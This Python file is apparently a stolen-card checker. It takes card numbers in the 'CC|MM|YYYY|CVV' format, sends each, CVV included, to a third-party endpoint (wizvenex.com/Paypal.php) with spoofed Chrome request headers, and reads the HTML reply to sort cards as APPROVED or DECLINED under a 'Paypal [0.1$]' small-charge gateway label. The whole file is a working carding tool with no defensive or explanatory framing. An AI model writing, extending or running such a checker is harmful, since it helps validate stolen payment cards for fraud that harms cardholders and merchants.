# py.py
import requests
import re

def process_paypal_response(raw_text):
    """Extract status and response message from PayPal HTML response"""
    # Check for approved status (text-success class)
    if 'text-success">APPROVED<' in raw_text:
        status = "APPROVED"
        # Extract the success message
        success_parts = raw_text.split('class="text-success">')
        if len(success_parts) > 1:
            response_msg = success_parts[1].split('</span>')[0].strip()
            # Clean up any HTML tags
            response_msg = re.sub('<[^<]+?>', '', response_msg)
        else:
            response_msg = "PAYPAL_APPROVED"
    
    # Check for declined status (text-danger class)
    elif 'text-danger">DECLINED<' in raw_text:
        status = "DECLINED"
        # Extract the declined message
        declined_parts = raw_text.split('class="text-danger">')
        if len(declined_parts) > 1:
            response_msg = declined_parts[1].split('</span>')[0].strip()
            # Clean up any HTML tags
            response_msg = re.sub('<[^<]+?>', '', response_msg)
        else:
            response_msg = "CARD_DECLINED"
    
    # Default to declined if no known patterns match
    else:
        status = "DECLINED"
        response_msg = "UNKNOWN_RESPONSE"
    
    return {
        "status": status,
        "response": response_msg,
        "gateway": "Paypal [0.1$]"
    }

def check_paypal_card(cc):
    """Check PayPal status for a single card"""
    # Basic CC format check
    parts = cc.split('|')
    if len(parts) != 4:
        return {
            "status": "DECLINED",
            "response": "Invalid format. Use CC|MM|YYYY|CVV",
            "gateway": "Paypal [0.1$]"
        }

    headers = {
        'authority': 'wizvenex.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
        'referer': 'https://wizvenex.com/',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # URL encode the card details
    import urllib.parse
    encoded_cc = urllib.parse.quote(cc)
    
    url = f'https://wizvenex.com/Paypal.php?lista={encoded_cc}'

    try:
        response = requests.get(url, headers=headers, timeout=30)
        return process_paypal_response(response.text)
        
    except requests.exceptions.Timeout:
        return {
            "status": "ERROR",
            "response": "TIMEOUT_ERROR",
            "gateway": "Paypal [0.1$]"
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"REQUEST_FAILED: {str(e)}",
            "gateway": "Paypal [0.1$]"
        }
